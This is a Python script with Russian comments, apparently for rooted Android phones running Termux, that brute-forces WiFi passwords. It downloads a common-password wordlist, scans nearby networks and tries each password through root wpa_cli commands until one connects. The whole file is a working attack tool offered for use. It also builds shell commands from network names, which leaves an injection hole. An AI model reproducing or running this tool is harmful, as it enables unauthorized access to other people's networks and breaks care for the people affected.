import subprocess
import time
import os
import sys
import requests
from concurrent.futures import ThreadPoolExecutor

class WiFiBruteForcer:
    def __init__(self):
        self.wordlist_path = "/sdcard/wifi_wordlist.txt"
        self.installed = False
        self.check_dependencies()
        
    def run_command(self, cmd):
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout
        except Exception as e:
            return f""
    
    def check_dependencies(self):
        if not os.path.exists("/data/data/com.termux/files/usr/bin/python"):
            print("Устанавливаем Python...")
            self.run_command("pkg update && pkg install python -y")
        
        if not os.path.exists("/data/data/com.termux/files/usr/bin/tsu"):
            print("Устанавливаем tsu...")
            self.run_command("pkg install tsu -y")
            
        if not os.path.exists("/data/data/com.termux/files/usr/bin/git"):
            print("Устанавливаем git...")
            self.run_command("pkg install git -y")
        
        try:
            import requests
        except:
            print("Устанавливаем requests...")
            self.run_command("pip install requests")
            
        self.installed = True
    
    def download_wordlist(self):
        if os.path.exists(self.wordlist_path):
            print("Словарь уже загружен")
            return True
            
        print("Загружаем словарь паролей...")
        wordlist_urls = [
            "https://raw.githubusercontent.com/ExNightHook/ExNightHook.github.io/refs/heads/main/100k-most-used-passwords-NCSC.txt"
        ]
        
        all_passwords = set()
        
        for url in wordlist_urls:
            try:
                print(f"Загрузка с {url}")
                response = requests.get(url, stream=True, timeout=60)
                if response.status_code == 200:
                    passwords = []
                    for line in response.iter_lines(decode_unicode=True):
                        if line and len(line) >= 8 and len(line) <= 63:
                            passwords.append(line.strip())
                            if len(passwords) % 1000 == 0:
                                all_passwords.update(passwords)
                                passwords = []
                                print(f"Загружено {len(all_passwords)} паролей...")
                    
                    all_passwords.update(passwords)
                    print(f"Успешно загружено {len(all_passwords)} паролей")
                    break
            except Exception as e:
                print(f"Ошибка загрузки: {e}")
                continue
        
        # Добавляем базовые пароли если не удалось загрузить
        if not all_passwords:
            print("Используем базовый словарь...")
            all_passwords = {
                "12345678", "password", "1234567890", "qwertyui", "admin", "00000000",
                "11111111", "12341234", "87654321", "password1", "123456789", "123456789a",
                "abc12345", "default", "123123123", "qwerty123", "1q2w3e4r", "1234abcd",
                "password123", "qazwsxedc", "1234qwer", "internet", "wireless", "admin123",
                "123abcde", "abcd1234", "passw0rd", "p@ssw0rd", "welcome1", "login123",
                "adminadmin", "rootroot", "letmein", "changeme", "freedom", "master",
                "hello123", "monkey123", "shadow123", "sunshine", "princess", "qwertyuiop"
            }
        
        # Сохраняем словарь
        with open(self.wordlist_path, 'w', encoding='utf-8') as f:
            for pwd in all_passwords:
                if 8 <= len(pwd) <= 63:
                    f.write(pwd + '\n')
        
        print(f"Словарь сохранен: {self.wordlist_path}")
        return True
    
    def get_wifi_list(self):
        print("Сканируем Wi-Fi сети...")
        
        # Используем разные методы сканирования
        methods = [
            "su -c 'iwlist wlan0 scan | grep ESSID'",
            "su -c 'wpa_cli -i wlan0 scan && sleep 3 && wpa_cli -i wlan0 scan_results'",
            "su -c 'cmd wifi list-networks'"
        ]
        
        networks = []
        
        for method in methods:
            try:
                result = self.run_command(method)
                for line in result.split('\n'):
                    if 'ESSID' in line and '"' in line:
                        essid = line.split('"')[1]
                        if essid and essid not in networks:
                            networks.append(essid)
                    elif len(line.split('\t')) >= 3 and 'WPA' in line:
                        parts = line.split('\t')
                        if len(parts) >= 3 and parts[2] not in networks:
                            networks.append(parts[2])
            except:
                continue
            
            if networks:
                break
        
        return list(set(networks))
    
    def try_connection(self, ssid, password):
        try:
            # Очищаем предыдущие настройки
            self.run_command("su -c 'wpa_cli -i wlan0 remove_network 0'")
            self.run_command("su -c 'wpa_cli -i wlan0 add_network'")
            
            # Настраиваем SSID
            self.run_command(f'su -c \'wpa_cli -i wlan0 set_network 0 ssid \"{ssid}\"\'')
            
            # Настраиваем PSK
            self.run_command(f'su -c \'wpa_cli -i wlan0 set_network 0 psk \"{password}\"\'')
            
            # Включаем сеть
            self.run_command('su -c \"wpa_cli -i wlan0 enable_network 0\"')
            self.run_command('su -c \"wpa_cli -i wlan0 select_network 0\"')
            
            time.sleep(6)
            
            # Проверяем статус
            result = self.run_command('su -c \"wpa_cli -i wlan0 status\"')
            
            if 'wpa_state=COMPLETED' in result or 'ip_address' in result:
                # Сохраняем конфигурацию
                self.run_command('su -c \"wpa_cli -i wlan0 save_config\"')
                return True
                
        except Exception as e:
            pass
            
        return False
    
    def brute_force_single(self, ssid, password):
        if self.try_connection(ssid, password):
            return password
        return None
    
    def brute_force_wifi(self, ssid):
        if not os.path.exists(self.wordlist_path):
            print("Словарь не найден, загружаем...")
            if not self.download_wordlist():
                return None
        
        print(f"Начинаем брутфорс сети: {ssid}")
        print("Это может занять время...")
        
        passwords = []
        with open(self.wordlist_path, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if 8 <= len(line.strip()) <= 63]
        
        print(f"Загружено {len(passwords)} паролей для проверки")
        
        # Используем многопоточность для ускорения
        found_password = [None]
        
        def worker_batch(passwords_batch):
            for pwd in passwords_batch:
                if found_password[0] is not None:
                    return
                    
                print(f"Пробуем: {pwd[:20]}{'...' if len(pwd) > 20 else ''}")
                if self.try_connection(ssid, pwd):
                    found_password[0] = pwd
                    return
        
        # Разбиваем на батчи для многопоточности
        batch_size = 100
        batches = [passwords[i:i + batch_size] for i in range(0, len(passwords), batch_size)]
        
        with ThreadPoolExecutor(max_workers=4) as executor:
            for i, batch in enumerate(batches):
                if found_password[0] is not None:
                    break
                    
                print(f"Батч {i+1}/{len(batches)}")
                executor.submit(worker_batch, batch)
                
                # Небольшая задержка между батчами
                time.sleep(1)
        
        if found_password[0]:
            print(f"УСПЕХ! Пароль найден: {found_password[0]}")
            return found_password[0]
        else:
            print("Пароль не найден в словаре")
            return None
    
    def auto_select_network(self):
        networks = self.get_wifi_list()
        if not networks:
            print("Сети не найдены. Проверьте Wi-Fi адаптер.")
            return None
        
        print("\nНайденные сети:")
        for i, network in enumerate(networks):
            print(f"{i+1}. {network}")
        
        try:
            if len(networks) == 1:
                choice = 0
                print(f"Автоматически выбрана сеть: {networks[0]}")
            else:
                choice = int(input("\nВыберите номер сети: ")) - 1
            
            if 0 <= choice < len(networks):
                return networks[choice]
            else:
                print("Неверный выбор")
                return None
        except ValueError:
            print("Введите число")
            return None
    
    def main(self):
        print("=== WiFi BruteForcer ===")
        print("Автоматическая установка зависимостей...")
        
        # Проверяем root
        root_check = self.run_command("su -c 'id'")
        if "uid=0" not in root_check:
            print("ОШИБКА: Требуются root-права!")
            print("Запустите: tsu")
            return
        
        # Загружаем словарь при первом запуске
        if not os.path.exists(self.wordlist_path):
            self.download_wordlist()
        
        # Получаем список сетей
        target_ssid = self.auto_select_network()
        if not target_ssid:
            return
        
        # Запускаем брутфорс
        password = self.brute_force_wifi(target_ssid)
        
        if password:
            print(f"\n=== УСПЕХ ===")
            print(f"Сеть: {target_ssid}")
            print(f"Пароль: {password}")
            print("Подключение сохранено в wpa_supplicant")
        else:
            print("\nНе удалось подобрать пароль")
            print("Попробуйте другой словарь или сеть")

if __name__ == "__main__":
    try:
        bruter = WiFiBruteForcer()
        bruter.main()
    except KeyboardInterrupt:
        print("\nОстановлено пользователем")
    except Exception as e:
        print(f"Критическая ошибка: {e}")